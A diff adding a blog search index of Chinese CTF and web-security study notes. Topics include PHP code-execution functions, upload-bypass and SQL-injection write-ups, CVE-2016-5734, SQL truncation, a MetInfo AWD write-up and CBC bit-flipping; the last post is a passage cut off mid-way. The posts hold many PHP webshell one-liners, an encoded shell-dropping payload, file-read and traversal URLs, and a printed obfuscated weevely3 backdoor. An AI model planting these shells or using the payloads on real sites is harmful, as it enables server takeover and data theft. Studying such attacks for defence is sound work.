@@ -1,0 +1,119 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title><![CDATA[代码审计--代码执行函数总结]]></title>
+    <url>%2F2018%2F07%2F09%2F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93%2F</url>
+    <content type="text"><![CDATA[PHP中存在很多执行代码的函数，最近也看了很多总结的文章，这类执行代码的函数常用于写一句话木马，可能导致代码执行漏洞，简单总结一下。 0x00常见函数eval() 、assert() 、preg_replace()、call_user_func()、call_user_func_array() 、uasort() 、usort()、array_map() 、array_reduce()、array_udiff()、create_function() 、 array_filter()、array_walk_recursive()、文件操作函数、动态执行函数。参考：https://www.cnblogs.com/xiaozi/p/7834367.html http://www.freebuf.com/column/148183.html 0x01 eval()eval() 函数把字符串按照 PHP 代码来计算,该php代码必须是合法的php代码，且必须以分号结尾。常用于一句话木马:1&lt;?php eval($_POST[cmd])?&gt; 这个就是我们常见的一句话木马，比较好理解。0x02 assert()函数在php语言中是用来判断一个表达式是否成立， 返回true or false，如果不为true则会返回一个警告。这个函数与eval() 函数一样，字符串被当作php代码执行 代码，1234&lt;?php//?cmd =phpinfo();@assert($_POST[&apos;cmd&apos;]);?&gt; 1234&lt;?php//?cmd=phpinfo()@assert($_REQUEST[cmd]);?&gt; 0x03 preg_replace()函数执行一个正则表达式的搜索和替换 语法：语法： 1mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )` 函数搜索subbject中与pattern相匹配的部分用replacement替换，执行正则表达式的搜索和替换，但是如果存在危险的/e修饰符，使preg_replace()中的replacement() 参数当作php代码执行。前边有文章已经分析这个危险函数。&lt;传送门&gt; 0x04 call_user_func()/call_user_func_array()这两个函数都是用来调用回调函数的。语法： 1mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) 第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。语法： 1mixed call_user_func_array ( callable $callback , array $param_arr ) 把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。call_user_func — 把第一个参数作为回调函数调用,其余参数是回调函数的参数。call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数。 1234&lt;?php//?cmd=phpinfo()@call_user_func(assert,$_GET[&apos;cmd&apos;]);?&gt; 123456&lt;?php//?cmd=phpinfo()$cmd=$_GET[&apos;cmd&apos;];$array[0]=$cmd;call_user_func_array(&quot;assert&quot;,$array);?&gt; 0x05 uasort()/usort()语法： 1bool usort ( array &amp;$array , callable $value_compare_func ) 本函数将用用户自定义的比较函数对一个数组中的值进行排序。 如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。语法： 1bool uasort ( array &amp;$array , callable $value_compare_func ) 本函数对数组排序并保持索引和单元之间的关联。主要用于对那些单元顺序很重要的结合数组进行排序。比较函数是用户自定义的。usort() 通过用户自定义的比较函数对数组进行排序。uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。 12345php环境&gt;=5.6才能用&lt;?php usort(...$_GET);?&gt;利用方式：test.php?1[]=1-1&amp;1[]=eval($_POST[&apos;x&apos;])&amp;2=assert[POST]:x=phpinfo(); 12345php环境&gt;=&lt;5.6才能用&lt;?php usort($_GET,&apos;asse&apos;.&apos;rt&apos;);?&gt;利用方式：test.php?1=1+1&amp;2=eval($_POST[x])[POST]:x=phpinfo(); 0x06 array_map()语法： 1array array_map ( callable $callback , array $array1 [, array $... ] ) array_map()：返回数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。 12345678&lt;?php//?func=system&amp;cmd=whoami$func=$_GET[&apos;func&apos;];$cmd=$_GET[&apos;cmd&apos;];$array[0]=$cmd;$new_array=array_map($func,$array);//print_r($new_array);?&gt; 0x07 array_reduce()语法： 1array_reduce(array,myfunction,initial) array_reduce() 函数向用户自定义函数发送数组中的值，并返回一个字符串。 1234&lt;?php$v=$_REQUEST[&apos;v&apos;];$arr=array(1);array_reduce($arr, $v, $_POST[&apos;pass&apos;]); 0x08 array_udiff()语法： 1array_udiff(array1,array2,array3...,myfunction) array_udiff() 函数用于比较两个（或更多个）数组的键值 ，并返回差集。 12345&lt;?php$v=$_REQUEST[&apos;v&apos;];$arr=array($_POST[&apos;pass&apos;]);$arr2=array(1);array_udiff($arr, $arr2, $v); 0x09 create_function()语法： 1string create_function ( string $args , string $code ) create_function主要用来创建匿名函数，其中内部使用了eval的操作导致存在安全问题。若没有对输入进行过滤，可以构造特殊字符串传递给create_function()导致执行任意命令。 12345&lt;?php//?cmd=phpinfo();$func=create_function(&apos;&apos;,$_REQUEST[&apos;cmd&apos;]);$func();?&gt; 0x10 array_filter()语法： 1array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) 依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。array_filter() 函数用回调函数过滤数组中的值。 1234567&lt;?php//?func=system&amp;cmd=whoami$cmd=$_GET[&apos;cmd&apos;];$array1=array($cmd);$func =$_GET[&apos;func&apos;];array_filter($array1,$func);?&gt; 0x11 array_walk_recursive()语法： 1array_walk_recursive(array,myfunction,parameter...) 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数 1234&lt;?php$e=$_REQUEST[&apos;e&apos;];$arr=array($_POST[&apos;pass&apos;] =&gt;&apos;|.*|e&apos;,);array_walk_recursive($arr, $e, &apos;&apos;); 0x12 文件操作函数利用文件操作，写入木马文件。 1234&lt;?php$test=&apos;&lt;?php eval($_POST[cmd]);?&gt;&apos;;file_put_contents(&apos;test1.php&apos;,$test);?&gt; 123&lt;?phpfputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;);?&gt; 0x13 函数 动态执行PHP函数直接由字符串拼接。 1234&lt;?php//?a=assert&amp;b=phpinfo()$_GET[&apos;a&apos;]($_GET[&apos;b&apos;]);?&gt; 自己的思考还比较少，总结的都是大佬的思路，慢慢补充自己的想法，其次对于php代码审计还得继续好好学，大部分漏洞的根源都是在代码上的问题。]]></content>
+      <categories>
+        <category>代码执行</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+        <tag>CTF</tag>
+        <tag>web</tag>
+        <tag>代码执行函数</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[安恒六月赛-web]]></title>
+    <url>%2F2018%2F07%2F08%2F%E5%AE%89%E6%81%92%E5%85%AD%E6%9C%88%E8%B5%9B-web%2F</url>
+    <content type="text"><![CDATA[1、研究生的密码 百度搜索 mongoDB payload： ?title[$ne]=1 2、ezupload 打开是文件上传的页面，思路应该是利用文件上传漏洞，上传小马连菜刀找flag。 先直接上传 php，提示不是图片文件。 把一句话木马修改后缀为 gif 然后上传，发现还是提示不是图片文件。猜测应该是判断文件内容来判断文件类型。 上传 gif 用bp 抓包： 修改包，让其根据内容判断为图片文件。注意修改的时候 添加的内容与头部信息 空一行。。 可以看到文件上传成功，我们的目的是要服务器把我们上传的当作php文件解析，先直接修改为php 上传成功，但是对上传的文件进行了重命名，猜测机制应该是把文件名后的 ，之后的改为gif 绕过： 发现成功将后缀名改为php，我们把php 加到前边来验证一下我们对改名机制的猜测： 猜测成立。。接下来，我们菜刀连接： 看到flag，直接在菜刀里读不出，下载后读到flag。 小结：这是一道比较简单的文件上传的题目，属于常规套路，通过这道题可以简单总结一下文件上传题目的思路。 3、mynote这道题目非常有意思，有三种解法，前两种都是非预期解，预期解涉及反序列化与条件竞争。从这道题学到很多姿势。。第一种：首先注册，并登陆，看看各个功能，发现有一个note功能和文件上传功能，note&gt;xss?? 先上传文件看看文件的检验机制是啥，发现几种图片文件，只有jpg格式图片能够上传成功，上传一句话改为jpg 并抓包： re go发现上传成功： 图片上传成功了，但是只有php文件能够解析，简单测试，先直接修改文件后缀： 上传成功了，也就是说我们的一句话木马成功上传，我们要做的就是知道文件路径，然后菜刀，怎么知道文件路径呢，得到大佬的hint 错误的cookie 爆出绝对路径。。接下来我们浏览我们上传的图片，并且抓包： 可以看到我们上传的文件 看到cookie 比较特殊 解密一下： 发现是序列化我们上传的文件名，我们说过要报错出绝对路径需要cookie 错误 ，我们修改cookie 并 替换 go 发现爆出了一个路径，我们用路径来访问我们上传的3.php 发现可以访问，菜刀连接，得到flag。 第二种：访问robots.txt发现： 访问flag.php 发现假的flag 大佬的思路是能不能用那种序列化cookie的方式读取flag.php 发现报错，upload下不存在 应该序列化读文件的地址就是upload下，而flag.php 在根目录下，所以我们需要用../进行目录穿越,判断为上两级目录： 发现读到flag.php 解码 预期解涉及条件竞争和反序列化，不懂，没有成功。 这几天准备考试，感觉有点慌orz，没有太多时间去学新的东西，利用复习之余也好好总结下前一段学习的知识，再不回顾就忘了。 还是得恶补基础、基础、基础！！！！]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>web</tag>
+        <tag>writeup</tag>
+        <tag>安恒杯</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[CVE-2016-5734--preg_replace的危险姿势]]></title>
+    <url>%2F2018%2F07%2F07%2FCVE-2016-5734%2F</url>
+    <content type="text"><![CDATA[昨天写完 preg_replace 危险函数，恰好今天看到两篇讲php危险函数和php隐藏后门的的文章，里边提到了‘preg_replace引发的phpmyadmin(4.3.0-4.6.2)命令执行漏洞’这篇文章&lt;传送门&gt;，根据这篇文章看一下实例中这个函数的危险姿势。 0x00漏洞触发原理 前一篇笔记已经说到了这个漏洞触发的原理，即： 1. 第一个参数需要e标识符，有了它可以执行第二个参数的命令 2. 第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令 如： 1//echo preg_replace(‘/test/e’, ‘phpinfo()’, ‘just test’);这样是可以执行命令的，第一个参数有e标识符，并且第一个参数在第三个参数中有匹配。 1//echo preg_replace(‘/test/e’, ‘phpinfo()’, ‘just tesxt’); 或者echo preg_replace(‘/tesxt/e’, ‘phpinfo()’, ‘just test’); 虽然第一个参数有e标识符，但是第一个参数在第三个参数中没有匹配，返回第三个参数，不执行。 0x01触发漏洞位置回溯 问题出现在/libraries/TableSearch.class.php中的_getRegexReplaceRows函数，我们全局搜索发现： 我们可以发现，$find 和$replacewith 在preg_replace()函数中被引用了 追踪一下 发现getReplacePreview调用了_getRegexReplaceRows函数 全局搜索发现 在/tbl_find_replace.php 调用 getReplacePreview：我们可以发现find 和 replaceWith都是通过post方式提交的。 0x02漏洞利用 这个漏洞目前没法直接利用，因为有token限制，需要登陆抓到token。需要构造第三个参数保证和第一个参数匹配，第一个参数可控，但是第三个参数是从数据库中取出的，我们只能提前插入到数据库中，然后再取出来，columnIndex是取出字段值的可控，所以第三个参数也可控了。 构 1234//$find = ’0/e’;//$fromsqldata = ’0/e’;//echo preg_replace(“/”.$find.”\0/”,$_POST[&quot;replaceWith&quot;],$fromsqldata);//preg_replace(‘/0/e’,&apos;phpinfo()’,’0/e‘); 小结：按照原文写了写，主要是为了加深理解。复现的过程中出现了问题，除了漏洞本身，主要是学到这种分析代码的过程。。 太累了。。又会是一个忙碌的周末orz。。]]></content>
+      <categories>
+        <category>漏洞实例</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+        <tag>CVE-2016-5734</tag>
+        <tag>危险函数</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[危险函数--preg_replace()]]></title>
+    <url>%2F2018%2F07%2F06%2F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E--preg_replace()%2F</url>
+    <content type="text"><![CDATA[晚自习在补警职的作业orz苦啊。。表哥在看书的时候遇到的一个小问题，和我分享了一下，想起以前也遇到过这个危险函数，没有总结。回到宿舍已经快熄灯了，等到查完寝，学习了一下，简要总结。网上文章也比较多，发现都是一样的。。。。。。。参考参考。 1、关于 preg_replace() 函数：preg_replace 函数执行一个正则表达式的搜索和替换语法： 1mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) 搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。2、危险来源：/e 修正符用在函数 preg_replace() 时，会将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。要确保 replacement 构成一个合法的php代码，才会执行，否则会报错。导致代码执行漏洞的产生。。 3、分析利用：代码： 123&lt;?echo preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;);?&gt; 如果提交：?h=phpinfo()，phpinfo()将会被执行（使用/e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行，即把phpinfo()执行） 在后门中的利用：h=eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(39).chr(100).chr(97). chr(116).chr(97).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(39).chr(119).chr(39).chr(41).chr(44).chr(39).chr(60). chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91). chr(99).chr(109).chr(100).chr(93).chr(41).chr(63).chr(62).chr(39).chr(41).chr(59))解码：?h= fputs(fopen(data/a.php,w),&lt;?php eval($_POST[cmd])?&gt;);执行后： 在/data/目录下生成一个一句话木马文件 a.php 另一个例子： 123456&lt;?function test($str)&#123;&#125;echo preg_replace(&quot;/s*[php](.+?)[/php]s*/ies&quot;, &apos;test(&quot;\1&quot;)&apos;, $_GET[&quot;h&quot;]);?&gt; 提交 ?h=[php]phpinfo()[/php] 正则匹配后， replacement 参数变为’test(“phpinfo”)’，此时phpinfo仅是被当做一个字符串参数了，不会执行。但是， 提交?h=[php]{${phpinfo()}}[/php]，phpinfo()就会被执行 因为 在php中，双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。 注意：双引号中的函数不会被执行和替换。通过{${}}构造出了一个特殊的变量，&#39;test(&quot;{${phpinfo()}}&quot;)&#39;，达到让函数被执行的效果（${phpinfo()}会被解释执行 4、限制条件：第一个参数需要e标识符，有了它可以执行第二个参数的命令。第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令。如： 12echo preg_replace(&quot;/texst/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;); echo preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst texst&quot;);都不会执 行，不满足第二个条件。 5、漏洞防范：将&#39;test(&quot;/1&quot;)&#39; 修改为&quot;test(&#39;/1&#39;)&quot;,这样‘${phpinfo()}&#39;就会被当做一个普通的字符串处理(单引号中的变量不会被处理)。 ps:整理写完已经是第二天了，，，orz。 睡觉。。明天还得复习，come on 。。。。。。。。]]></content>
+      <categories>
+        <category>CTF-web</category>
+      </categories>
+      <tags>
+        <tag>危险函数</tag>
+        <tag>CTF</tag>
+        <tag>web</tag>
+        <tag>代码执行漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[sql注入--敏感函数 MD5()的利用]]></title>
+    <url>%2F2018%2F07%2F05%2Fsql%E6%B3%A8%E5%85%A5--%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0%2F</url>
+    <content type="text"><![CDATA[突然想到很久前做的实验吧上的一道很有意思的注入题，当时看的大佬的wp，也不是很懂，今天就再看一下XD界面是这样的: 看下源码： 提交password 然后数据库查询，查询的时候用到这个 1password = &apos;&quot;.md5($password,true).&quot;&apos; 假如查询语句是： 1$sql = &quot;SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;$_post(password)&apos;&quot;; 我们很容易就绕过了–‘ or ‘1’=’1 或 ‘or 1=1;– 12$sql = &quot;SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;&apos;or &apos;1&apos;=&apos;1&apos;&quot;;$sql = &quot;SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;&apos;or 1=1; 但是这个题目需要经过MD5加密，怎么绕过呢？orz。。这里有个tip：原始MD5哈希在sql中很危险 看一下MD5()函数语法：md5(string,raw)参数：string： 必需。规定要计算的字符串。 raw：可选。规定十六进制或二进制输出格式： TRUE - 原始 16 字符二进制格式 FALSE - 默认。32 字符十六进制数 危险就在于MD5()函数的第二个参数true, If the second argument to MD5 is true, it will return ugly raw bits instead of a nice hex string(如果第二个参数为true，会返回原始值而不是16进制），raw MD5 hashes are dangerous in SQL statements because they can contain characters with special meaning to MySQL(原始值会包含mysql中的特殊字符，因此很危险）。 如果md5计算后的值经过hex转成字符串后为 ”or’xxx’这样的字符串就可以绕过。 网上搜到两个payload：129581926211651571912466741651878684928ffifdyopffifdyop md5后，276f722736c95d99e921722cf9ed621再转成字符串： &#39;or&#39;6&lt;trash&gt;查询语句就变成： 1$sql = &quot;SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;&apos;or &apos;6&lt;trash&gt; 成功绕过登陆。字符串是百度的，至于咋来的不懂，有老外的一篇文章&lt;传送门&gt;。 关键利用点就是MD5()敏感函数，还是要多多积累这样的危险函数。坚持写blog，要考试了，好好复习XD]]></content>
+      <categories>
+        <category>CTF-web</category>
+      </categories>
+      <tags>
+        <tag>危险函数</tag>
+        <tag>CTF</tag>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[sql约束攻击]]></title>
+    <url>%2F2018%2F07%2F05%2Fsql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB%2F</url>
+    <content type="text"><![CDATA[昨天在做bugku的题的时候遇到一道sql约束攻击的题目，比较简单，但是感觉比较有意思，简单梳理一下。应该昨天发的，看大佬的博客看到一点多，太困了，就今天早上起来整理了一下XD。小假期结束了，要开始复习了orz~参考大佬的博客：传送门 sql约束攻击的思路：利用数据库对空格符的特殊处理方式来达到水平越权的目的。 知识背景： 1、字符串比较：在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“admin”等同于“admin空格”，对于绝大多数情况来说都是成立的（如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果是一样的： 12SELECT * FROM users WHERE username=&apos;admin&apos;;SELECT * FROM users WHERE username=&apos;admin &apos;; 当然这种特性有时候也存在异常情况，例如LIKE子句。PS:对尾部空白符的这种修剪操作，主要是在“字符串比较”时进行的。比较字符串时SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。因为在数据库中查询就是比较字符串，利用字符串这种比较特性，所以两者查询结果是一样的。 2、INSERT截断：设计一个字段时，SQL都会根据VARCHAR(n)来限制字符串的最大长度。当实际输入的字符串大于最大长度的时候，数据库会对其进行截断。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“admin空格x”时，实际上只能插入字符串的前5个字符，即“admin”。 利用场景： 1、场景：当我们需要登陆[admin]来获取想要的信息，但我们却不知道admin的密码的时候，我们可以注册[admin空格x] 用我们注册的登陆密码登陆admin，达到目的，注意注册的用户名无数空格后还有字符x，否则注册查询的时候会查重，空格个数要超过数据库的长度限制。 2、代码： 1）注册用户： 12345678910111213141516171819202122&lt;?php// Checking whether a user with the same username exists$username = mysql_real_escape_string($_GET[&apos;username&apos;]);$password = mysql_real_escape_string($_GET[&apos;password&apos;]);$query = &quot;SELECT * FROM users WHERE username=&apos;$username&apos;&quot;;$res = mysql_query($query, $database);if($res) &#123; if(mysql_num_rows($res) &gt; 0) &#123; // User exists, exit gracefully . . &#125; else &#123; // If not, only then insert a new entry $query = &quot;INSERT INTO users(username, password) VALUES (&apos;$username&apos;,&apos;$password&apos;)&quot;; . . &#125;&#125; 由代码可知，我们注册时会先从数据库查询我们注册的username是否存在，如果存在就会报重，不存在就执行INSERT。我们用[admin空格x]注册，绕过username验证，执行INSERT，因为数据库对字符串长度进行了限制，所以实际插入的前几位，也就是注册的为[admin空格]，只要我们的空格足够多，就可以实现。 2）验证登陆： 1234567891011121314&lt;?php$username = mysql_real_escape_string($_GET[&apos;username&apos;]);$password = mysql_real_escape_string($_GET[&apos;password&apos;]);$query = &quot;SELECT username FROM users WHERE username=&apos;$username&apos; AND password=&apos;$password&apos; &quot;;$res = mysql_query($query, $database);if($res) &#123; if(mysql_num_rows($res) &gt; 0)&#123; $row = mysql_fetch_assoc($res); return $row[&apos;username&apos;]; &#125;&#125;return Null; 可见登陆的时候可以利用[admin]和注册[admin空格]的密码来登陆，就可以绕过验证。 利用限制： 当然这种攻击是局限性的需要满足：1、服务端没有对用户名长度进行限制。如果限制了我们就无法注册[admin空格x]。2、登陆验证的SQL语句必须是用户名和密码一起验证。如果是验证流程是先根据用户名查找出对应的密码，然后再比对密码的话，那么也不能进行利用。因为当使用admin为用户名来查询密码的话，数据库此时就会返回两条记录，而一般取第一条则是目标用户的记录，那么你传输的密码肯定是和目标用户密码匹配不上的。3、验证成功后返回的必须是用户传递进来的用户名，而不是从数据库取出的用户名。因为当我们以用户admin和密码登陆时，其实数据库返回的是我们自己的用户信息，而我们的用户名其实是[admin空格]，如果此后的业务逻辑以该用户名为准，那么就不能达到越权的目的了。 防御手段：我们可以利用限制条件来进行防御。]]></content>
+      <categories>
+        <category>CTF-web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>web</tag>
+        <tag>sql约束攻击</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[“蓝帽杯”--第一次AWD之旅]]></title>
+    <url>%2F2018%2F07%2F03%2F%E2%80%9C%E8%93%9D%E5%B8%BD%E6%9D%AF%E2%80%9D--%E7%AC%AC%E4%B8%80%E6%AC%A1AWD%E4%B9%8B%E6%97%85%2F</url>
+    <content type="text"><![CDATA[很幸运参加了第二届“蓝帽杯”的分区赛，这也是参加的第一场线下赛，体验非常好，学到了很多东西，也见识到了大佬们的姿势。全程在防守，审出漏洞也看不出来，不会用，要学的还有太多了。参加的是浙江赛区的比赛，赛后重新梳理了一下web题目。 题目是 Metinfo6.0.0，一共有5个漏洞，4个主办方加进去的，还有一个Metinfo6.0.0任意文件读取漏洞。 1、 后台seo任意文件读取漏洞路径：\admin\seo\htm.php源码：12if(isset($_GET[&apos;seourl&apos;]))&#123;echo file_get_contents(base64_decode(&apos;L2ZsYWc=&apos;));&#125; 12payload:/admin/seo/htm.php?seourl 2、 weevely3后门路径：\app\system\news\web\news.class.php源码：1234567891011121314151617$t = &apos;pre2Fss(@2Fx(@b2Fase64_deco2F2Fde(preg2F_r2Fepl2Face(array(&quot;/_/&quot;,2F&quot;2F/-/&quot;),array(&quot;/2F&quot;,&quot;2F+&quot;)2&apos;; $O = &apos;er&quot;2F;$i=$m[1][02F]2F.$m[1][1];2F$h=$sl2F($s2Fs(md5(2F$i.$kh)2F2F2F,0,3));$2Ff2F=$sl(2F$ss(md5(&apos;; $s = &apos;rpos(2F$p,$h)===0)2F&#123;$2Fs[$i]=2F&quot;&quot;;$p=2F$ss($p,3)2F2F2F;&#125;if(array2F_key_2Fexists($i,$s))2F&#123;2F$s&apos;; $U = &apos;F,$ss($s[2F$i2F],0,2F$e))),$k2F)2F));2F$o2F=ob_get_contents();ob_end_2Fclean(2F);$2Fd=b2Fase64_&apos;; $l = &apos;2F[$i].=$p;2F$e=strpos($s2F[2F$i2F],$f);if($e2F2F)&#123;$k=2F2F$kh.$kf;ob_start();@ev2Fal(@gzu2Fncom&apos;; $A = str_replace(&apos;Th&apos;, &apos;&apos;, &apos;ThcreThThaThte_funThThction&apos;); $N = &apos;m2F);if($2Fq&amp;&amp;$m)&#123;@ses2Fsion_2Fstar2Ft();$s=&amp;2F$_S2FESSION;$ss2F2F=&quot;substr&quot;;$sl2F=&quot;strt2F2Folow&apos;; $q = &apos;&quot;2F&quot;;for($i=0;$i&lt;$2Fl;)2F&#123;2Ffor($j=0;($j&lt;$2Fc&amp;&amp;$i&lt;$l2F);$j+2F+,2F$i++)2F&#123;$o.=$t&#123;$i&#125;^2F$k&#123;$j2F&#125;;&apos;; $K = &apos;=array_value2Fs2F($q);preg2F_2Fma2Ftch_a2Fll(&quot;/([\\w])[\\w-2F]+2F(?:2F;q=0.([\\d]))?,?/&quot;,$2Fra2F,$&apos;; $F = &apos;_LANGUAGE2F&quot;];if($rr&amp;&amp;2F$r2F2Fa)&#123;$u=par2Fse2F_u2Frl($rr);parse2F_str($2Fu2F[&quot;query&quot;],$q2F)2F;$q&apos;; $c = &apos;2F&#125;&#125;return $2Fo;2F&#125;$r=$_2FSE2FRVE2FR;$rr=@2F$r[&quot;2FHT2FTP_2FREFERER&quot;];$ra=@$r[2F&quot;HTTP_ACCE2F2FPT&apos;; $d = &apos;$i.2F$kf)2F,0,3));$p=&quot;&quot;;for($z=2F1;$z&lt;coun2Ft2F($m[1]);$z+2F+)2F$p.=$q[$m2F[2]2F[$2Fz]2F];if(st&apos;; $X = &apos;$kh=&quot;ccd2&quot;2F;$kf=&quot;2Fe8f9&quot;;f2Funct2Fion x($2Ft,$2Fk)&#123;$c=st2Fr2Fl2Fen($k);$l=strlen2F($t2F);$o=2F&apos;; $m = &apos;e2Fncode(x(gzc2Fomp2Fr2Fess($o),2F$k))2F;print(&quot;&lt;2F$k&gt;2F$d&lt;/$k2F&gt;&quot;);@se2Fss2Fion_destroy();&#125;&#125;&#125;&#125;&apos;; $E = str_replace(&apos;2F&apos;, &apos;&apos;, $X . $q . $c . $F . $K . $N . $O . $d . $s . $l . $t . $U . $m); $I = $A(&apos;&apos;, $E); $I(); 这是 一个PHP混淆后门，混淆的特别乱，将原来的代码打乱顺序混淆。经过分析，混淆进行的操作，先按照 $X . $q . $c . $F . $K . $N . $O . $d . $s . $l . $t . $U . $m 拼接字符串，然后删除2F，去除$l 中的Th 利用create_function()创建$l函数进行反混淆和美化：3、任意文件读取漏洞路径：\app\system\img\web\img.class.php源码：1234567891011public function doshowimg()&#123; global $_M; $this-&gt;showpage(&apos;img&apos;); if(isset($_GET[&apos;images&apos;]))&#123; @$imga=$_GET[&apos;a&apos;]; @$imgs=$_GET[&apos;b&apos;].&apos;tents&apos;; echo @$imgs($imga);&#125; require_once $this-&gt;template(&apos;tem/showimg&apos;); &#125;&#125; get 方式提交images、a、b 其中 get b 后边是tents b=构成 file_get_contens1payload: ?images=1&amp;b=file_get_con&amp;a=/flag 4、任意文件读取漏洞路径：\app\system\include\ module\old_thumb.class.php关键代码：1payload：/include/thumb.php?dir=http/...././/...././/...././/...././/...././/flag 5、 找回密码处任意文件上传漏洞123456POST ////////admin/index.php?lang=cn&amp;anyid=&amp;n=getpassword&amp;c=index&amp;a=dogetpassword HTTP/1.1Host: . . . .action=next2&amp;abt_type=2&amp;admin_mobile=123123&amp;admin_type=/tmp/1.php&amp;submit=%E4%B8%8B%E4%B8%80%E6%AD%A5 最后有一个漏洞看了wp才知道的，通过这次比赛更加证明了自己的菜，而且不是一般的菜，要学的东西还有很多，漏洞中的weevely3后门和Metinfo6.0.0任意文件读取漏洞还是得单独总结复现一下，另外要积累各种漏洞存在的形式，像是各种混淆后门、变形木马、任意文件读取的方式等。 学喜欢的，做想做的，加油！]]></content>
+      <categories>
+        <category>CTF-AWD</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>web</tag>
+        <tag>AWD</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[CBC字节翻转攻击]]></title>
+    <url>%2F2018%2F07%2F02%2FCBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%2F</url>
+    <content type="text"><![CDATA[前段时间ISCC遇到了一道CBC字节翻转攻击的题目，感觉比较有意思，就总结了一下。 1、首先来了解一下CBC模式：CBC模式是分组密码模式的一种，其加密过程如下： IV：初始化向量。plaintext：明文分组。cipertext：密文分组。key：密钥。CBC工作于一个固定的比特组，称为一个块。本文我们把16字节作为一个块。简单来说：CBC模式加密就是先将明文进行分组（常见16字节为一组），将每个明文分组与前一个密文分组进行XOR运算再通过key加密得到密文，其中第一组明文与初始化向量IV进行XOR运算得到第一组密文。最后将IV与得到的密文拼接得到最终的密文。从加密的方式我们不难发现各组都是有关联的，这是与ECB得不同之处，与ECB比较相对比较安全。其解密过程： 理解了加密，解密也容易理解，就是加密得逆过程：从密文中提取出IV，然后分组，每组密文先用key解密，然后再与上一组得密文XOR运算得到明文，其中第一组用key解密之后再和IV XOR运算得到明文。 2、从CBC模式得原理我们不难发现 如果我们想改变解密后的某一明文，得到我们想得到得明文，如果是第一组，只需要改变IV，否则只需要改变上一组密文，就可以控制我们得到的明文。如下图：我们要改变1处想要得到特定明文，就可以修改2处的密文，这就是CBC字节翻转攻击的简单理解。3、利用CBC字节翻转攻击的题目往往是修改密文，使密文修改后解密得到我们想得到的明文，绕过限制。这类题目的源码都是差不多的，以下面源码为例分析一下： 源码的意思是，随机产生初始化向量IV把输入的username序列化 然后加密 IV也加密解密并验证 如果username为admin 则输出flag但是后边限制了post的username 不能为admin我们便可以用CBC字节翻转攻击绕过这种限制，也就是修改加密后username 使其解密后为admin 得到flag。3、例题：（ISCC2018. Only admin can see flag） 根据提示在index.txt 看到源码： 审计代码，发现admin登陆才可以得到flag，但是又限制post的username不能为admin，很显然要用CBC字节翻转攻击，先用abmin 登陆，再根据攻击原理改为admin。 用username=abmin 登陆，bp抓包： 得到IV 和cipher。 根据CBC加密过程我们先将输入序列化并分组（16字节为一组）：s:2:{s:8:”username”;s:5:”abmin”;s:8:”password”;s:5:”abmin”;}① s:2:{s:8:”userna② 